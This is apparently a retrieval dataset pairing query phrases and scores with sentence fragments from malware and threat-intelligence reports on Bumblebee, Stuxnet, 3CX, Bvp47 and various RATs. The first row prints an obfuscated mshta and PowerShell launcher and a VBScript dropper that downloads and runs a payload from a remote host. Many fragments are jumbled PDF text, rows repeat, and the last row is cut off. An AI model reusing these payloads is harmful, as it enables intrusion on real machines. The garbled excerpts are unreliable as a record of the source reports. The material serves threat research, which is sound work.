javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
Because rundll32.exe executed PowerShell, we can see that rundll32.exe created|0.7795162889370029|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
whoami|1.0|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.|1.0|['The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due toother reports, likely arrived via an email which included a link to download said zip file.The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.When the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL (namr.dll) containing the Bumblebee malware loader.', 'From there, the loader reached out to the Bumblebee C2 servers.', 'At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.', 'This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).', 'From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.Four hours after initial access, the threat actor used RDP to access a server using the local Administrator account.', 'The threat actor then deployed AnyDesk, which was the only observed persistence mechanism used during the intrusion.', 'The threat actor then started Active Directory discovery usingAdfind.After this activity, the threat actors went silent.', 'Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.', 'AdFind was used again as well.', 'Next, the threat actor transferredSysinternals tool Procdumpover SMB, to the ProgramData folders on multiple hosts in the environment.', 'They then used remote services to execute Procdump, which was used to dump LSASS.']
operating system version|0.8282125686890636|['After changing the note for a victim, the botmaster requested a list of SMS messages from a victim with the HTTP request POST /stuff .php?mode=showSmsList.', 'The response to this request was a long list of more than 900 SMS messages from one victim.', 'The SMS messages are analysed in Section 6.', 'The original HTTP response with the SMS list was a JSON fi le using Unicode encoding (\\\\u chars) for transferring Russian characters.', 'The following is an example: {response: [{conversations: {+900:[{body:\\\\u0421\\\\u043f \\\\u0438\\\\u0441\\\\u0430\\\\u043d\\\\u0438 The decoded text in Russian is as follows (the password was redacted): : Platbox (RUB 120.00); : 342365.  .', '.', 'The English translation of this message is: Withdrawal of funds: Platbox (RUB 120.00); password: 342365.', 'Do not disclose the password to ANYONE.', 'Only fraudsters request passwords.', 'This SMS seems to be a message from the Platbox Russian payment system saying that 120 Russian Rubles have been withdrawn.', 'Despite our initial assumption that the botnet was only looking for two-factor authentication messages, it is unclear why the botmasters are monitoring these messages.']
operating system version|0.8295711038894622|"['These domains include is to create.', ""In this instance, the configured named bbs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dll, as shown in Figure 2."", ""Due to the www.adv138mail.com'32."", 'namebeing configurable, theRAT willnot alwaysbe called winsvcfs.dll.', 'The configuration block also The RAT has many different capabilities and contains a callback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares command and control communications.', 'operating system.', ""The RAT's behaviour changes The callback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is installed on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are installed.', 'Modules used by the RAT deployed to the SK Communications network If no configuration is specified, the malware include: uses default values instead.', 'The default callback location hardcoded into the malware is the private IP address, 192.168.0.200.', 'This address is not 28Theprocesssvchost.exe is agenerichostprocessforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLLs.']"
operating system version|0.8650803686783772|[']com All values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C XOR algorithm).', 'The encrypted blob (cookie value) is initially a JSON dictionary, encrypted with the RC4 algorithm (using the key BD DE 96 D2 9C 68 EE 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 00 4E F2 E4 92 5C 76 AB FC 90 23 DF C6, decoded from stage 2 content), XORed (using the Type B XOR algorithm), base64- encoded and URL-encoded.', 'The actual JSON content is very similar to the one that is sent by VileDropper to the C2 server: Provided by JSON Key VileDropper via Value the command line Hard-coded value (65 in the last sample we analyzed) which might be a v version number.', 'u The target identifier.', 'a The list of security solutions installed on the targeted computer.', 'w The targets operating system version.', 'd A fixed identifier, which might designate a campaign or version.', 'n The targets fully qualified login (%USERDOMAIN%\\\\%USERNAME%).', 'r Flag that indicates if the mutex creation succeeded (1) or failed (0).', 'xn Current process name (e.g., SerenadeDACplApp.exe).', 's Constant value embedded in the code and equal to 0.']
operating system version|0.8282125686890636|"['After changing the note for a victim, the botmaster requested a list of SMS messages from a victim with the HTTP request POST /stuff .php?mode=showSmsList.', 'The response to this request was a long list of more than 900 SMS messages from one victim.', 'The SMS messages are analysed in Section 6.', 'The original HTTP response with the SMS list was a JSON fi le using Unicode encoding (\\\\u chars) for transferring Russian characters.', 'The following is an example: {""response"": [{""conversations"": {""+900"":[{""body"":""\\\\u0421\\\\u043f \\\\u0438\\\\u0441\\\\u0430\\\\u043d\\\\u0438 The decoded text in Russian is as follows (the password was redacted): : Platbox (RUB 120.00); : 342365.  .', '.', 'The English translation of this message is: Withdrawal of funds: Platbox (RUB 120.00); password: 342365.', 'Do not disclose the password to ANYONE.', 'Only fraudsters request passwords.', 'This SMS seems to be a message from the Platbox Russian payment system saying that 120 Russian Rubles have been withdrawn.', 'Despite our initial assumption that the botnet was only looking for two-factor authentication messages, it is unclear why the botmasters are monitoring these messages.']"
keyboard layout|0.7840576488838199|['Memory is allocated for the main shellcode and at the chosen hijacked address, Stuxnet only places a small piece of shellcode that will jump to the main shellcode.', 'Next, Stuxnet drops a malformed keyboard layout file into the Temp directory with the file name ~DF<random>.', 'tmp.', 'The malformed keyboard layout file contains a byte that will result in the overly large index into the func- tion table.', 'NtUserLoadKeyboardLayoutEx is called to load the malformed keyboard layout file successfully invok- ing the exploit.', 'The original keyboard layout is restored and then the malformed keyboard layout file is deleted.', 'The shellcode then loads the main Stuxnet DLL in the context of CSRSS.EXE.', 'Page 19W32.Stuxnet Dossier Security Response Load Point Stuxnet drops Resource 242 MrxCls.sys via Export 16.', 'MrxCls is a driver digitally signed with a compromised Realtek certificate that was revoked on July 16, 2010 by Verisign.', 'A different version of the driver was also found signed by a different compromised digital certificate from JMicron.', 'Mrxcls.sys is a driver that allows Stuxnet to be executed every time an infected system boots and thus acts as the main load-point for the threat.']
to decrypt it using AES GCM algorithm|0.8157310772553182|['Any endpoint impacted by this malicious update should be isolated and investigated for further signs of compromise.', 'Organizations should assess the potentially impacted information on these endpoints and look to cycle secrets to reduce the risk of additional future compromise.', 'ICONIC Analysis Stage #1: Supply Chain Attacks - ICONIC Volexitys analysis began with one of the installers tagged as malicious in public discourse: Name(s) 3CXDesktopApp-18.12.416.msi Size 97.8MB (102555648 Bytes) File Type Windows Installer MD5 0eeb1c0133eb4d571178b2d9d14ce3e9 SHA1 bfecb8ce89a312d2ef4afc64a63847ae11c6f69e SHA256 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 The installer contains a malicious version of ffmpeg.dll, an open-source video player library: Name(s) ffmpeg.dll Size 2.7MB (2814976 Bytes) File Type Win32 DLL MD5 74bc2d0b6680faa1a5a76b27e5479cbc SHA1 bf939c9c261d27ee7bb92325cc588624fca75429 SHA256 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 The library is loaded by 3CXDesktopApp.exe, and it is used to decode and inject a payload into memory: Name(s) N/A Size 288.0KB (294912 Bytes) File Type application/x-dosexec MD5 11bc82a9bd8297bd0823bce5d6202082 SHA1 894e7d4ffd764bb458809c7f0643694b036ead30 SHA256 f79c3b0adb6ec7bcc8bc9ae955a1571aaed6755a28c8b17b1d7595ee86840952 2/10The purpose of this malware, which Volexity will refer to as ICONIC, is as follows: Download various files that contain additional code, with names such as icon[0-15].ico, hosted at https://github[.]com/IconStorages/images/.', '(Note: the GitHub repository has since been taken down.)', 'Parse these files to identify a $ character followed by a base64-encoded string appended to the end of the ICO files.', 'Decrypt the base64 string using the AES-GCM encryption algorithm.', 'All values required to decrypt AES-GCM are derived from a complex function that third-party researchers have indicated is based on a publicly available gist.', 'Once the string is decoded, it contains the URLs with which the DLL will then communicate to receive a next- stage payload.', 'The next-stage payload is a JSON object that is then parsed and must further be decrypted (with the same AES-GCM decryption function).', 'The next stage is expected to be a 64-bit PE that is reflectively loaded through a shellcode loader stored at the head of the file.', 'A script is provided with this post on GitHub that can be used to decrypt the base64 blobs appended to the ICO files.']
The decrypted password|0.8582688304665139|['If an mRemote installation is located, the dropper reads the configuration file and checks if theres a NODE that is defined with Username=root, Protocol=SSH, and a password that is not blank.', 'Ifthose conditions are satisfied it extracts the information.', 'The password is decrypted after being extracted.', 'If a SecureCRT installation is located, the dropper extracts information from sessions that have Username=root, Protocol=SSH and a saved password.', 'If these conditions are satisfied, the username, hostname, port, and password are extracted.', 'The password is then decrypted.', 'After extracting these connection and server details, the dropper uses the previously dropped alg.', 'exe and conime.exe to attempt to connect remote servers, upload and run the bash script ~pr1.tmp.', 'The bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and then attempts to wipe the /kernel, /usr /etc and /home directories, thus rendering the machine inoperative.', 'Win32 Wiper component When the AgentBase.exe component is executed, it first attempts to stop the following processes, presumably in order to evade detection: pasvc.exe policy agent from AhnLab clisvc.exe ViRobot ISMS from Hauri It then enumerates all physical drives and overwrites the first 512 bytes with the string: princpes, effectively destroying the MBR (master boot record) of the affected drive.', 'It continues to look for removable and fixed drives, locates the root directory on these drives, and then attempts to delete all files and folders in this directory.']
Screen Capture|0.7874139748068278|"['For example, MicRecord runs in the context of the malware itself and not as an external plugin.', 'The recording is performed using the mciSendStringA API and the following command lines: Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 open new type waveaudio alias Record1 set Record1 time format ms set Record1 bitspersample 16 set Record1 samplespersec 16000 set Record1 bytespersec 8000 set Record1 channels 2 record Record1 notify stop Record1 save Record1 ""C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\1.wav"" close Record1 Below is the full list of supported Stealth Soldier commands: Implant Command Arguments Description Implant possible error possible error Error occured in getting Folder Directory Sends all directory Directory List of is: + Contents + DirectoryList name content filenames Managed to Count %d Files Before Error Uploads the file to the File content + File File Failed to UploadFile filename C&C Uploaded Successfully be uploaded ScreenShot Taken Error Occured Successfully + Image to Runs sc.exe and sends in Creating Screenshot be uploaded = 1.png + to C&C ScreenShot ScreenShot Taken & Process Uploaded Successfully C:\\\\Users\\\\Public\\\\1.wav + Records the victims Failed to content + Recording MicRecord sleep time computer and sends it to Upload Saved & Uploaded C&C Recording File Successfully Error Occured Runs plugin kl.exe KeyLogger Task Started in Creating Keylogger (downloads it from C&C) Successfully KeyLogger Process 4/11Implant Command Arguments Description Implant possible error possible error Error Occured Runs BrCr.exe module BrowserCreds Task in Creating BrowserCreds (downloads it from C&C) Started Successfully BrowserCreds Process Command : : Runs PowerShell CommandExecutionResultExecuted but command with for Command: is: Failed to PowerPlus module CmdExec command +Command : : Executed Upload Result (pwls.dll).', 'The result of and Result Sent or Command : the command will be in Successfully : Failed to be C:\\\\Users\\\\Public\\\\Exec.', 'Executed Plugins The payload runs several plugins: first it downloads them, then writes to their respective filenames, and finally executes.', 'At the time of our analysis, some of the modules were no longer available for download.', 'Screen Capture The screen capture plugin is called sc.exe and is downloaded from the C&C server.', 'It is a compiled .NET open- source project named https://github.com/bencevans/screenshot-desktop.', 'The module supports the following arguments (can be seen using the flag /h or /help) Plain text Copy to clipboard Open code in new window EnlighterJS 3 Syntax Highlighter <filename> captures the screen or the active window and saves it to a file.', 'Usage: filename [WindowTitle] filename - the file where the screen capture will be saved allowed file extensions are - Bmp,Emf,Exif,Gif,Icon,Jpeg,Png,Tiff,Wmf.', 'WindowTitle - instead of capture whole screen you can point to a window with a title which will put on focus and captuted.', 'For WindowTitle you can pass only the first few characters.']"
Screen Capture|0.7662544960977556|"['Access Command and T1032 Standard Cryptographic Protocol The RAT uses SSL for encrypting C2 communications.', 'Control T1043 Commonly Used Port The RAT uses port 443. https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 6/75/15/2020 Mikroceen: Spying backdoor leveraged in high-profile networks in Central Asia | WeLiveSecurity Tactic ID Name Description T1071 Standard Application Layer The RAT uses the Schannel implementation of SSL.', 'Protocol T1001 Data Obfuscation The RATs interface controls the client with obfuscated commands.', 'T1030 Proxy Connection The RAT has a proxy option that masks traffic between the malware and the remote operators.', 'Exfiltration T1041 Exfiltration Over Command and The operator of the RAT can download any desired file from a victim.', 'Control Channel Collection T1113 Screen Capture The RAT can capture the victims screen.', 'Peter Klnai 14 May 2020 - 02:00PM https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 7/7']"
Screen Capture|1.0|"[""TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT."", 'TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger\'\' detailing TigerRAT and its downloader ""TigerDownloader.""', 'This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""']"
File enumeration|0.9100250359764475|['zero-day during the same period using both techniques.', 'blog, ssl, pic, mail, news, etc.', 'There was also evidence to implants.', 'The actors relied heavily on the free Dynamic The exploit domain glkjcorp.com was registered shortly As to other documented cases, the attacker started suggest this group attempted to gather user credentials DNS providers No-IP (http://www.noip.com), Oray (http:// before the attack on May 24, 2012.', 'Two different emails interacting with the infected machine within minutes for Yahoo, Windows Live and other accounts through www.oray.com/) and 3322 (http://www.pubyun.com/) were used in the registration of this domain: effort09 (at) of compromise to begin manual network and host several different phishing domains during July and for their infrastructure continuing into 2011; the earliest hotmail.com and zaizhong16 (at) 126.com.', 'enumeration.', 'August 2011. known backdoors SPEAR identified communicated to This attack was the first to use the file DeployJava.', '323332.3322.org and 1stone.zapto.org.', 'In October 2011, the group attempted to take advantage While SPEAR was unable to recover the original pages js to fingerprint installed software on victim systems of the ongoing Libyan crisis at the time and phish the news served, the domains these pages were hosted on It wasnt until June 2011 that Operation Dust Storm prior to delivery and ensure a known effective exploit cycle regarding Muammar Gaddafis death on October are: login.live.adobekr.com, login.live.wih365.com, started to garner some notoriety from a series of was deployed.', 'This JavaScript file was first used 20, 2011.', 'It appears that in addition to some US defense and yahoomail.adobeus.com.']
download, upload|0.7725429938532279|['Although our analysis and attribution efforts are ongoing, we have discovered some indicators that suggest the threat actor may be a Chinese group.', 'The campaigns The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.', '1.', 'Interactive map of Ukraine The threat actor started this campaign around February 26, 2022, and distributed its custom malware with the name interactive_map_UA.exe, trying to disguise it as an interactive map of Ukraine.', 'This campaign began a few days after Russia invaded Ukraine, which shows the threat actor was monitoring the situation between Ukraine and Russia and took advantage of it to lure targets in Russia.', '2.', 'Log4j patch In this campaign the threat actor packaged its custom malware in a tar file called Patch_Log4j.tar.gz, a fake fix for Decembers high-profile Log4j vulnerability.', 'This campaign ran in early March and was primarily aimed at RT TV (formerly Russia Today or Rossiya Segodnya, a Russian state-controlled international television network funded by the Russian government).', 'The APT group had access to almost 100 RT TV employees email address.', 'The emails were sent with the subject .', '.']
download, upload|0.8686500073530549|['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 2022.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0CC95976081C7A85C7926C03172A3DDAA672690042C) appears to be a curriculum 4/17vitae (similar to a resume) of an individual named Roshan.']
download, upload|0.8880095466174223|['command codes in the MargualsRAT indicating that this RAT is actively in development by the attackers.', 'ALLAKORE Allakore is a publicly available Delphi- based RAT that has consistently been used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Allakore include: Keylogging.', 'Capture screenshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change wallpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Command handler of MargulasRAT.', 'containing a limited set of capabilities.']
Take screenshots|1.0|['Ability to keep memory artifacts hidden from EDRs and AV.', 'Direct Windows SYS calls on the fly.', 'Egress over HTTP, HTTPS, DNS Over HTTPS, SMB and TCP.', 'LDAP Sentinel provides a rich GUI interface to query various LDAP queries to the domain or a forest.', 'Multiple command and control channels multiple pivot options such as SMB, TCP, WMI, WinRM and managing remote services over RPC.', 'Take screenshots.', 'x64 shellcode loader.', 'Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).']
Take screenshots|0.7542935086937963|"['It particularly targets Google Chrome.', 'Enables a Socks5 reverse proxy server in the infected machine via the open source project tsocks.', '14/19Persistence is achieved by creating a new LNK file in the startup folder ""\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WINN.lnk"".', 'Exfiltrate files to the remote server via web sockets.', 'Run custom VBS scripts in the infected machine.', ""Take screenshots from the victim's machine."", 'Generate remote shell sessions.', 'All these capabilities in addition to the very low detection rate of the payload, which during this investigation, has remained close to zero even after 3 months of its first report (see image below), are the perfect recipe for the success of this threat actor.', 'We are currently tracking this tool as the IceBreaker Backdoor, and we continue researching it to help community understand, identify and effectively respond against this new threat.', ""Conclusions For the past several months we've been tracking a new threat we call IceBreaker APT which targets the gaming/gambling industry."", 'The threat appeared just a few months before the largest gaming/gambling conference in the world, ICE London, hence we decided to give it that name.']"
Take screenshots|0.892075886711548|"[""Keylogger Keylogger stores keystrokes to the following file: %TEMP%\\\\log%d.txt Here is a sample of malware key-log output: (((((((Hello new File))))))))) +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [UP][DOWN][DOWN][UP][UP][DOWN][UP][DOWN][DOWN][UP][UP][DOWN][DOWN][DOWN][UP][UP][UP][UP] [DOWN][DOWN][DOWN][DOWN]r +++++++++++++ Window= Run +++++++++++++ cmd[ENTER] +++++++++++++ Window= C:\\\\WINDOWS\\\\system32\\\\cmd.exe +++++++++++++ notepad[ENTER] +++++++++++++ Window= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark +++++++++++++ [DOWN][UP] +++++++++++++ Window= Untitled - Notepad +++++++++++++ test test test +++++++++++++ 2015 Check Point Software Technologies Ltd. All rights reserved | 34This file will be sent to remote C&C server later on."", 'If the malware detects an open Gmail, Yahoo or Outlook window, it will add special processing so the attacker can easily recognize the data that is the most valuable to him.', 'The following string will be appended to the output file: \\\\r/////////////\\\\r\\\\nMail Find Webcam capture The malware may capture photos from an attached webcam.', 'Files are first saved with the name test.bmp, later converted to JPEG and saved under the new file name Cam.jpg, eventually exfiltrated to the C&C server.', 'TCP Connection Table The malware will gather available metadata regarding current TCP connections using the GetTcpTable API, and send a formatted version of the obtained data to the C&C server.', 'Screenshots The malware may take screenshots.', 'The filename used for screenshots is Screeny.jpeg.', 'Remote Shell (Live Command Execution) The malware creates the following process as a live command prompt: cmd.exe /c cmd.exe This process output and input are attached and redirected via pipes to the remote C&C server, allowing the operator to type in commands to control the victim computer.', 'The following line is first sent to the server: Welcome To mpkshell Command Line (This Message Send From Server) Traffic Monitoring The malware may sniff all TCP and UDP traffic on the machine.', 'This is achieved through the use of RAW sockets.', 'The following status strings can be sent to the C&C server: Initializing Winsock 2.2...']"
Take screenshots|0.7716093549780308|['Figure 13: Decoded data of 15882060891.jpg Below figure shows contents of hxxp://www[.]m9c[.]net/uploads/15882060892.jpg.', 'It is the encoded data of the final payload.', 'https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 9/128/12/2020 Gorgon APT targeting MSME sector in India Figure 14: Contents of 15882060892.jpg Final Payload Agent Tesla: Below figure shows injected Agent Tesla payload in RegAsm.exe.', 'Figure 15: Injected payload Agent Tesla is a well-known keylogger and infostealer written in DotNet.', 'This malware steals information from a variety of applications like Web Browsers, Email Clients, FTP Clients, Messenger applications, VPN clients, etc.', 'and can also take screenshots of the system.', 'All stolen data is exfiltrated over SMTP.', 'https://www.seqrite.com/blog/gorgon-apt-targeting-msme-sector-in-india/ 10/128/12/2020 Gorgon APT targeting MSME sector in India We have already explored and analysed Agent Tesla in our last couple of blogs: https://www.seqrite.com/blog/advance-campaign-targeting-manufacturing-and-export- sectors-in-india/ https://www.seqrite.com/blog/coronavirus-themed-campaign/ Conclusion Most TTPs shared above, have been seen on several occasions in the last few years.', 'Looking at malware, C2 and technique execution, Quick Heal correlates this campaign on MSME sector to Gorgon group [a.k.a.', 'Subaat].', 'All members of the Gorgon cyber-criminal group purport to have Pakistan-based interests/connections.']
Take screenshots|1.0|['All the modules we observed contain shared code responsible for: Encrypting the data.', 'Exfiltrating gathered data through a POST request or by uploading it to an FTP server.', 'Sending execution logs to a remote server.', 'In addition to this, each module performs some specific job.', 'We managed to retrieve and analyze the next modules: List installed applications.', 'Take screenshots.', '4/14List running processes.', 'Get OS and computer information.', 'Execute a predefined command from the C&C.', 'Clean up any traces created by different modules.', 'Applications Module This module uses two methods to fetch installed applications.']
Take screenshots|0.8813012751957298|['Enumerate Drives.6.', 'Enumerate Processes by ID, Name, or Privileges.7.', 'Start and Stop Processes.8.', 'Enumerate Files and Directories.9.', 'Open a Named Pipe and Send and Receive Data.10.', 'Take Screenshots.11.', 'Inject into User Processes.12.', 'Enumerate Services.13.', 'Start/Stop Services.14.', 'Modify the Registry.15.', 'Open/Close TCP and UDP Sessions.--- End Program Capabilities ---The program will also look for the following paths: \\\\SetupUi, \\\\AppIni, and \\\\ExtInfo.']
Encrypted and compressed payload|0.9615998068178301|"['Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 33.', 'Backdoor Overview Bvp47 After some effort, our forensic team successfully extracted the backdoor file on the compromised machine and found that the string ""Bvp"" is more common in the sample file and the value 0x47 is used in the encryp- tion algorithm.', 'We will temporarily name the sample file "" Bvp47"".', 'File Structure File Properties Filename initserial or others HashMD5 58b6696496450f254b1423ea018716dc File Size 299,148 bytes File Path /usr/bin/modload Platform Linux File Structure ELF Payload The basic file structure of Bvp47 includes two parts: loader and payload.', 'The loader is mainly responsible for the decryption and memory loading of the payload.', 'The payload is compressed and encrypted.', 'The 18 slices are simply divided into three types T0, T1, T2, named Slice0x00-Slice0x11: - T0{Slice0x00} - T1{Slice0x01-Slice0x10} - T2{Slice0x11} After decompression analysis, the sizes of the 18 slices of Bvp47 are as follows: Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 4The 18 slices are sorted according to the amount of Bvp engine API calls used by each slice (for the intro- duction of Bvp engine, see following chapters) and the amount of export functions, the details are as follows (the red part is modules that need to be focused on): Slice Main Feature Bvp API Call Export Function Comments 0x00 Detect runtime environment 190 0 0x01 490 192 0x02 5 8 0x03 14 9 0x04 3 2 0x05 16 3 0x06 152 10 0x07 264 10 0x08 17 3 0x09 3 8 0x0A 14 0 1 init function 0x0B Non-PE module, Bvp offset database 0 0 0x0C 0 0 module_main 0x0D Dewdrops 0 15 module_main 0x0E SectionChar_Agent 0 0 module_main 0x0F 94 17 0x10 Non-PE module, Bvp offset database 0 0 0x11 PATh=.', 'crond Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 5Usage Scenario Our team reproduced the use of the Bvp47 backdoor in our own environment and roughly clarified its usage scenarios and basic communication mechanisms.', 'As an important backdoor platform for long-term control of victims after a successful invasion, Bvp47 generally lives in the Linux operating system in the demilitarized zone that communicates with the Internet.', 'It mainly assumes the core control bridge commu- nication role in the overall attack, as shown in the following figure: Attacker(SYN Knock) Hacker Internete.g.', '443port GateWay Router/Firewall TCP Lateral movement Internal Server DMZ Email server etc.']"
Encrypted and compressed payload|0.9615998068178301|"['Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 33.', 'Backdoor Overview Bvp47 After some effort, our forensic team successfully extracted the backdoor file on the compromised machine and found that the string ""Bvp"" is more common in the sample file and the value 0x47 is used in the encryp- tion algorithm.', 'We will temporarily name the sample file "" Bvp47"".', 'File Structure File Properties Filename initserial or others HashMD5 58b6696496450f254b1423ea018716dc File Size 299,148 bytes File Path /usr/bin/modload Platform Linux File Structure ELF Payload The basic file structure of Bvp47 includes two parts: loader and payload.', 'The loader is mainly responsible for the decryption and memory loading of the payload.', 'The payload is compressed and encrypted.', 'The 18 slices are simply divided into three types T0, T1, T2, named Slice0x00-Slice0x11: - T0{Slice0x00} - T1{Slice0x01-Slice0x10} - T2{Slice0x11} After decompression analysis, the sizes of the 18 slices of Bvp47 are as follows: Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 4The 18 slices are sorted according to the amount of Bvp engine API calls used by each slice (for the intro- duction of Bvp engine, see following chapters) and the amount of export functions, the details are as follows (the red part is modules that need to be focused on): Slice Main Feature Bvp API Call Export Function Comments 0x00 Detect runtime environment 190 0 0x01 490 192 0x02 5 8 0x03 14 9 0x04 3 2 0x05 16 3 0x06 152 10 0x07 264 10 0x08 17 3 0x09 3 8 0x0A 14 0 1 init function 0x0B Non-PE module, Bvp offset database 0 0 0x0C 0 0 module_main 0x0D Dewdrops 0 15 module_main 0x0E SectionChar_Agent 0 0 module_main 0x0F 94 17 0x10 Non-PE module, Bvp offset database 0 0 0x11 PATh=.', 'crond Beijing Qi An Pangu Laboratory Technology Co., Ltd www.pangulab.cn 5Usage Scenario Our team reproduced the use of the Bvp47 backdoor in our own environment and roughly clarified its usage scenarios and basic communication mechanisms.', 'As an important backdoor platform for long-term control of victims after a successful invasion, Bvp47 generally lives in the Linux operating system in the demilitarized zone that communicates with the Internet.', 'It mainly assumes the core control bridge commu- nication role in the overall attack, as shown in the following figure: Attacker(SYN Knock) Hacker 